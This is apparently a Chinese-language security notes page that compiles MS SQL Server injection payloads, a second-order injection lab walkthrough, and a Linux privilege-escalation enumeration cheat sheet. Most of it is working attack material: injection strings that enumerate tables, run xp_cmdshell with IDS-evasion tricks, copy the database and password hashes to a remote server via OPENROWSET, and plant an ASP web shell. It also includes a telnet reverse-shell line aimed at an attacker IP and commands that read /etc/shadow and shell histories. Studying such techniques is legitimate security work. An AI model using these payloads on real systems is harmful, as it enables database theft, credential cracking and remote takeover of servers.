<h5 id="查询构造："><a href="#查询构造：" class="headerlink" title="#查询构造："></a>#查询构造：</h5><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM news WHERE id&#x3D;... AND topic&#x3D;... AND .....

adminand 1&#x3D;(select count(*) from [user] where username&#x3D;victim and right(left(userpass,01),1)&#x3D;1) and userpass &lt;&gt;

select 123;--

;use master;--

:a or name like fff%;-- 显示有一个叫ffff的用户哈。

and 1&lt;&gt;(select count(email) from [user]);--

;update [users] set email&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0) where name&#x3D;ffff;--

;update [users] set email&#x3D;(select top 1 id from sysobjects where xtype&#x3D;u and name&#x3D;ad) where name&#x3D;ffff;--

;update [users] set email&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and id&gt;581577110) where name&#x3D;ffff;--

;update [users] set email&#x3D;(select top 1 count(id) from password) where name&#x3D;ffff;--

;update [users] set email&#x3D;(select top 1 pwd from password where id&#x3D;2) where name&#x3D;ffff;--

;update [users] set email&#x3D;(select top 1 name from password where id&#x3D;2) where name&#x3D;ffff;--

上面的语句是得到数据库中的第一个用户表，并把表名放在ffff用户的邮箱字段中。

通过查看ffff的用户资料可得第一个用表叫ad

然后根据表名ad得到这个表的ID 得到第二个表的名字

insert into users values( 666,char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73),char(0x63)+char(0x68)+char(0x72)+char

(0x69)+char(0x73),0xffff)--

insert into users values( 667,123,123,0xffff)--

insert into users values ( 123,admin--,password,0xffff)--

;and user&gt;0

;and (select count(*) from sysobjects)&gt;0

;and (select count(*) from mysysobjects)&gt;0 &#x2F;&#x2F;为access数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="枚举出数据表名"><a href="#枚举出数据表名" class="headerlink" title="#枚举出数据表名"></a>#枚举出数据表名</h5><pre class="line-numbers language-none"><code class="language-none">;update aaa set aaa&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0);--

这是将第一个表名更新到aaa的字段处。

读出第一个表，第二个表可以这样读出来（在条件后加上 and name&lt;&gt;；刚才得到的表名）。

;update aaa set aaa&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0 and name&lt;&gt;vote);--

然后id&#x3D;1552 and exists(select * from aaa where aaa&gt;5)

读出第二个表，一个个的读出，直到没有为止。

读字段是这样：

;update aaa set aaa&#x3D;(select top 1 col_name(object_id（表名），1));--

然后id&#x3D;152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名

;update aaa set aaa&#x3D;(select top 1 col_name(object_id（表名），2));--

然后id&#x3D;152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名

[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]

update 表名 set 字段&#x3D;(select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0 [ and name&lt;&gt;；你得到的表名 查出一个加一个])

[ where 条件] select top 1 name from sysobjects where xtype&#x3D;u and status&gt;0 and name not in(table1,table2，…）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号-当前帐号必须是SYSADMIN组"><a href="#通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号-当前帐号必须是SYSADMIN组" class="headerlink" title="###通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]"></a>###通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]</h5><h5 id="获得数据表字段名-将字段值更新为字段名，再想法读出这个字段的值就可得到字段名"><a href="#获得数据表字段名-将字段值更新为字段名，再想法读出这个字段的值就可得到字段名" class="headerlink" title="###[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]"></a>###[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]</h5><pre class="line-numbers language-none"><code class="language-none">update 表名

set 字段&#x3D;(select top 1 col_name(object_id（要查询的数据表名），字段列如：1) [ where 条件]

绕过IDS的检测[使用变量]

;declare @a sysname set @a&#x3D;xp_+cmdshell exec @a dir c:\

;declare @a sysname set @a&#x3D;xp+_cm’+’dshell exec @a dir c:\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="开启远程数据库"><a href="#开启远程数据库" class="headerlink" title="开启远程数据库"></a>开启远程数据库</h4><h5 id="基本语法"><a href="#基本语法" class="headerlink" title="#基本语法"></a>#基本语法</h5><pre class="line-numbers language-none"><code class="language-none">select * from OPENROWSET(SQLOLEDB,server&#x3D;servername;uid&#x3D;sa;pwd&#x3D;123,select * from table1 )

参数： (1) OLEDB Provider name

其中连接字符串参数可以是任何端口用来连接，比如

select * from OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from table

复制目标主机的整个数据库insert所有远程表到本地表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="基本语法："><a href="#基本语法：" class="headerlink" title="#基本语法："></a>#基本语法：</h5><pre class="line-numbers language-none"><code class="language-none">insert into OPENROWSET(SQLOLEDB,server&#x3D;servername;uid&#x3D;sa;pwd&#x3D;123,select * from table1) select * from table2

这行语句将目标主机上table2表中的所有数据复制到远程数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：

insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from table1) select * from

table2

insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from _sysdatabases)

select * from master.dbo.sysdatabases

insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from _sysobjects)

select * from user_database.dbo.sysobjects

insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from _syscolumns)

select * from user_database.dbo.syscolumns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="复制数据库："><a href="#复制数据库：" class="headerlink" title="#复制数据库："></a>#复制数据库：</h5><pre class="line-numbers language-none"><code class="language-none">insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from table1)select * from database..table1 insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from table2) select * fromdatabase..table2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="复制哈希表（HASH）登录密码的hash存储于sysxlogins中。方法如下："><a href="#复制哈希表（HASH）登录密码的hash存储于sysxlogins中。方法如下：" class="headerlink" title="#复制哈希表（HASH）登录密码的hash存储于sysxlogins中。方法如下："></a>#复制哈希表（HASH）登录密码的hash存储于sysxlogins中。方法如下：</h5><pre class="line-numbers language-none"><code class="language-none">insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from _sysxlogins) select

* from database.dbo.sysxlogins

得到hash之后，就可以进行暴力破解。

遍历目录的方法：先创建一个临时表：temp

;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--

;insert temp exec master.dbo.xp_availablemedia;-- 获得当前所有驱动器

;insert into temp(id) exec master.dbo.xp_subdirs c:\;-- 获得子目录列表

;insert into temp(id,num1) exec master.dbo.xp_dirtree c:\;-- 获得所有子目录的目录树结构，并寸入temp表中

;insert into temp(id) exec master.dbo.xp_cmdshell type c:\web\index.asp;-- 查看某个文件的内容

;insert into temp(id) exec master.dbo.xp_cmdshell dir c:\;--

;insert into temp(id) exec master.dbo.xp_cmdshell dir c:\ *.asp &#x2F;s&#x2F;a;--

;insert into temp(id) exec master.dbo.xp_cmdshell cscript. C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc

;insert into temp(id,num1) exec master.dbo.xp_dirtree c:\;-- （xp_dirtree适用权限PUBLIC）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="写入表："><a href="#写入表：" class="headerlink" title="#写入表："></a>#写入表：</h5><pre class="line-numbers language-none"><code class="language-none">语句1：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(sysadmin));--

语句2：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(serveradmin));--

语句3：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(setupadmin));--

语句4：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(securityadmin));--

语句5：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(securityadmin));--

语句6：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(diskadmin));--

语句7：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(bulkadmin));--

语句8：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(bulkadmin));--

语句9：and 1&#x3D;(SELECT IS_MEMBER(db_owner));--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="把路径写到表中去："><a href="#把路径写到表中去：" class="headerlink" title="#把路径写到表中去："></a>#把路径写到表中去：</h5><pre class="line-numbers language-none"><code class="language-none">;create table dirs(paths varchar(100),id int)--

;insert dirs exec master.dbo.xp_dirtree c:\--

and 0&lt;&gt;(select top 1 paths from dirs)--

and 0&lt;&gt;(select top 1 paths from dirs where paths not in(@Inetpub))--

;create table dirs1(paths varchar(100),id int)--

;insert dirs exec master.dbo.xp_dirtree e:\web--

and 0&lt;&gt;(select top 1 paths from dirs1)--

把数据库备份到网页目录：下载

;declare @a sysname; set @a&#x3D;db_name();backup database @a to disk&#x3D;e:\web\down.bak;--

and 1&#x3D;(Select top 1 name from(Select top 12 id,name from sysobjects where xtype&#x3D;char(85)) T order by id desc)

and 1&#x3D;(Select Top 1 col_name(object_id(USER_LOGIN),1) from sysobjects) 参看相关表。

and 1&#x3D;(select user_id from USER_LOGIN)

and 0&#x3D;(select user from USER_LOGIN where user&gt;1)

-&#x3D;-wscript.shellexample -&#x3D;-

declare @o int

exec sp_oacreate wscript.shell,@o out

exec sp_oamethod @o,run,NULL,notepad.exe

; declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,notepad.exe--

declare @o int,@f int,@t int,@ret int

declare @line varchar(8000)

exec sp_oacreate scripting.filesystemobject,@o out

exec sp_oamethod @o,opentextfile,@f out,c:\boot.ini,1

exec @ret &#x3D; sp_oamethod @f,readline,@line out

while( @ret &#x3D; 0 )

begin

print @line

exec @ret &#x3D; sp_oamethod @f,readline,@line out

end

declare @o int,@f int,@t int,@ret int

exec sp_oacreate scripting.filesystemobject,@o out

exec sp_oamethod @o,createtextfile,@f out,c:\inetpub\wwwroot\foo.asp,1

exec @ret &#x3D; sp_oamethod @f,writeline,NULL,

&lt;% set o &#x3D; server.createobject(&quot;wscript.shell&quot;): o.run( request.querystring(&quot;cmd&quot;) ) %&gt;

declare @o int,@ret int

exec sp_oacreate speech.voicetext,@o out

exec sp_oamethod @o,register,NULL,foo,bar

exec sp_oasetproperty @o,speed,150

exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to,us,528 waitfor delay 00:00:05

; declare @o int,@ret int exec sp_oacreate speech.voicetext,@o out exec sp_oamethod @o,register,NULL,foo,bar exec

sp_oasetproperty @o,speed,150 exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to us,528 waitfor delay 00:00:05--

xp_dirtree适用权限PUBLIC

exec master.dbo.xp_dirtree c:\

返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。

create table dirs(paths varchar(100),id int)

建表，这里建的表是和上面xp_dirtree相关连，字段相等、类型相同。

insert dirs exec master.dbo.xp_dirtree c:\

只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="18-sql注入利用"><a href="#18-sql注入利用" class="headerlink" title="18.sql注入利用"></a>18.sql注入利用</h2><p>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>网页篡改：通过操作数据库对特定网页进行篡改。<br>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p>
<h2 id="19-SQL二级注入"><a href="#19-SQL二级注入" class="headerlink" title="19.SQL二级注入"></a>19.SQL二级注入</h2><h3 id="什么是二次注入？"><a href="#什么是二次注入？" class="headerlink" title="什么是二次注入？"></a>什么是二次注入？</h3><p>简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p>
<p>网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用</p>
<p>可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。</p>
<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><strong>二次注入需要具备的两个条件：</strong></p>
<p>（1）用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</p>
<p>（2）数据库对自己存储的数据非常放心，直接取出恶意数据给用户</p>
<p>登录页面 新建用户</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220853348.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220904887.png"></p>
<p>数据插进去了</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220918444.png"></p>
<p>登录</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220931620.png"></p>
<p>修改密码</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220945418.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220952552.png"></p>
<p>修改完后查看下，当前账号admin’# 并没修改到密码 还是原来的123456 倒是把表中另一个admin账号修改了</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221002982.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221012280.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221021396.png"></p>
<p>查看修改密码页面的源代码</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221034559.png"></p>
<p>传进来的的语句变成了这样</p>
<p>$pass变量&#x3D;传进来的新密码 $username 当前用户 $curr_pass 当前用户登录密码</p>
<p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;123456789&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p>
<p>#把后面的都给注释了，所以就是修改了admin用户的密码为123456789</p>
<p>用这条语句把admin改回原来的密码</p>
<p><code>update users set password=&#39;admin&#39; where username=&#39;admin&#39;#&#39; and password=123456789;</code></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221112046.png"></p>
<h2 id="20-linux下的敏感文件？"><a href="#20-linux下的敏感文件？" class="headerlink" title="20.linux下的敏感文件？"></a>20.linux下的敏感文件？</h2><p>来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jb19900111/article/details/18619653?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&amp;dist_request_id=1328603.386.16148619991812411&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control">https://blog.csdn.net/jb19900111/article/details/18619653?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&amp;dist_request_id=1328603.386.16148619991812411&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control</a></p>
<p> 在本文开始之前，我想指出我不是专家。据我所知，在这个庞大的区域,没有一个“神奇”的答案.分享，共享（我的出发点）。下面是一个混合的命令做同样的事情，在不同的地方，或只是一个不同的眼光来看待事物。我知道有更多的“东西”去寻找。这只是一个基本粗略的指南。并不是每一个命令，做好要注重细节.</p>
<p> 文中的每行为一条命令，文中有的命令可能在你的主机上敲不出来，因为它可能是在其他版本的linux中所使用的命令。</p>
<p> 列举关键点</p>
<p> （Linux）的提权是怎么一回事：</p>
 <pre class="line-numbers language-none"><code class="language-none">收集 – 枚举，枚举和一些更多的枚举。
过程 – 通过数据排序，分析和确定优先次序。
搜索 – 知道搜索什么和在哪里可以找到漏洞代码。
适应 – 自定义的漏洞，所以它适合。每个系统的工作并不是每一个漏洞“都固定不变”。
尝试 – 做好准备,试验和错误。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 系统类型</p>
<p> 系统是什么版本?</p>
<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;issue
cat &#x2F;etc&#x2F;*-release
cat &#x2F;etc&#x2F;lsb-release
cat &#x2F;etc&#x2F;redhat-release<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>它的内核版本是什么？</p>
<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;proc&#x2F;version  
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls &#x2F;boot | grep vmlinuz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>它的环境变量里有些什么？</p>
<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;profile
cat &#x2F;etc&#x2F;bashrc
cat ~&#x2F;.bash_profile
cat ~&#x2F;.bashrc
cat ~&#x2F;.bash_logout
env
set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>是否有台打印机？</p>
<pre class="line-numbers language-none"><code class="language-none">lpstat -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 应用与服务</p>
<p> 正在运行什么服务？什么样的服务具有什么用户权限？</p>
<pre class="line-numbers language-none"><code class="language-none">ps aux
ps -ef
top
cat &#x2F;etc&#x2F;service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>哪些服务具有root的权限？这些服务里你看起来那些有漏洞,进行再次检查！</p>
<pre class="line-numbers language-none"><code class="language-none">ps aux | grep root
ps -ef | grep root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？</p>
<pre class="line-numbers language-none"><code class="language-none">ls -alh &#x2F;usr&#x2F;bin&#x2F;
ls -alh &#x2F;sbin&#x2F;
dpkg -l
rpm -qa
ls -alh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archivesO
ls -alh &#x2F;var&#x2F;cache&#x2F;yum&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？</p>
<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;syslog.conf
cat &#x2F;etc&#x2F;chttp.conf
cat &#x2F;etc&#x2F;lighttpd.conf
cat &#x2F;etc&#x2F;cups&#x2F;cupsd.conf
cat &#x2F;etc&#x2F;inetd.conf
cat &#x2F;etc&#x2F;apache2&#x2F;apache2.conf
cat &#x2F;etc&#x2F;my.conf
cat &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf
cat &#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf
ls -aRl &#x2F;etc&#x2F; | awk ‘$1 ~ &#x2F;^.*r.*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>主机上有哪些工作计划？</p>
<pre class="line-numbers language-none"><code class="language-none">crontab -l
ls -alh &#x2F;var&#x2F;spool&#x2F;cron
ls -al &#x2F;etc&#x2F; | grep cron
ls -al &#x2F;etc&#x2F;cron*
cat &#x2F;etc&#x2F;cron*
cat &#x2F;etc&#x2F;at.allow
cat &#x2F;etc&#x2F;at.deny
cat &#x2F;etc&#x2F;cron.allow
cat &#x2F;etc&#x2F;cron.deny
cat &#x2F;etc&#x2F;crontab
cat &#x2F;etc&#x2F;anacrontab
cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>主机上可能有哪些纯文本用户名和密码?</p>
<pre class="line-numbers language-none"><code class="language-none">grep -i user [filename]
grep -i pass [filename]
grep -C 5 &quot;password&quot; [filename]
find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p> 通信与网络</p>
<p> NIC(s)，系统有哪些？它是连接到哪一个网络？</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig -a
cat &#x2F;etc&#x2F;network&#x2F;interfaces
cat &#x2F;etc&#x2F;sysconfig&#x2F;network<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？</p>
<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;resolv.conf
cat &#x2F;etc&#x2F;sysconfig&#x2F;network
cat &#x2F;etc&#x2F;networks
iptables -L
hostname
dnsdomainname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其他用户主机与系统的通信？</p>
<pre class="line-numbers language-none"><code class="language-none">lsof -i
lsof -i :80
grep 80 &#x2F;etc&#x2F;services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>缓存？IP和&#x2F;或MAC地址?</p>
<pre class="line-numbers language-none"><code class="language-none">arp -e
route
&#x2F;sbin&#x2F;route -nee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>数据包可能嗅探吗？可以看出什么？监听流量</p>
<pre class="line-numbers language-none"><code class="language-none"># tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>你如何get一个shell？你如何与系统进行交互？</p>
<pre class="line-numbers language-none"><code class="language-none"># http:&#x2F;&#x2F;lanmaster53.com&#x2F;2011&#x2F;05&#x2F;7-linux-shells-using-built-in-tools&#x2F;
nc -lvp 4444    # Attacker. 输入 (命令)
nc -lvp 4445    # Attacker. 输出(结果)
telnet [atackers ip] 44444 | &#x2F;bin&#x2F;sh | [local ip] 44445    # 在目标系统上. 使用 攻击者的IP!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如何端口转发？（端口重定向）</p>
<p># rinetd</p>
<pre class="line-numbers language-none"><code class="language-none"># http:&#x2F;&#x2F;www.howtoforge.com&#x2F;port-forwarding-with-rinetd-on-debian-etch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p># fpipe</p>
<pre class="line-numbers language-none"><code class="language-none"># FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>#ssh</p>
<pre class="line-numbers language-none"><code class="language-none"># ssh -[L&#x2F;R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>#mknod</p>
<pre class="line-numbers language-none"><code class="language-none"># mknod backpipe p ; nc -l -p [remote port] &lt; backpipe  | nc [local IP] [local port] &gt;backpipe
mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe    # Proxy (Port 80 to 8080)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>mknod</p>
<pre class="line-numbers language-none"><code class="language-none">backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc
localhost 80 | tee -a outflow &amp; 1&gt;backpipe    # Proxy monitor (Port 80 to 8080)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>建立隧道可能吗？本地，远程发送命令</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> 秘密信息和用户</p>
<p> 你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？</p>
<pre class="line-numbers language-none"><code class="language-none">id
who
w
last
cat &#x2F;etc&#x2F;passwd | cut -d:    # List of users
grep -v -E &quot;^#&quot; &#x2F;etc&#x2F;passwd | awk -F: &amp;#039;$3 &#x3D;&#x3D; 0 &#123; print $1&#125;&#39;   # List of super users
awk -F: &#39;($3 &#x3D;&#x3D; &quot;0&quot;) &#123;print&#125;&amp;#039; &#x2F;etc&#x2F;passwd   # List of super users
cat &#x2F;etc&#x2F;sudoers
sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以找到什么敏感文件？</p>
<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;passwd
cat &#x2F;etc&#x2F;group
cat &#x2F;etc&#x2F;shadow
ls -alh &#x2F;var&#x2F;mail&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>什么有趣的文件在home&#x2F;directorie（S）里？如果有权限访问</p>
<pre class="line-numbers language-none"><code class="language-none">ls -ahlR &#x2F;root&#x2F;
ls -ahlR &#x2F;home&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置</p>
<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;var&#x2F;apache2&#x2F;config.inc
cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD
cat &#x2F;root&#x2F;anaconda-ks.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>用户做过什么？是否有任何密码呢？他们有没有编辑什么？</p>
<pre class="line-numbers language-none"><code class="language-none">cat ~&#x2F;.bash_history
cat ~&#x2F;.nano_history
cat ~&#x2F;.atftp_history
cat ~&#x2F;.mysql_history
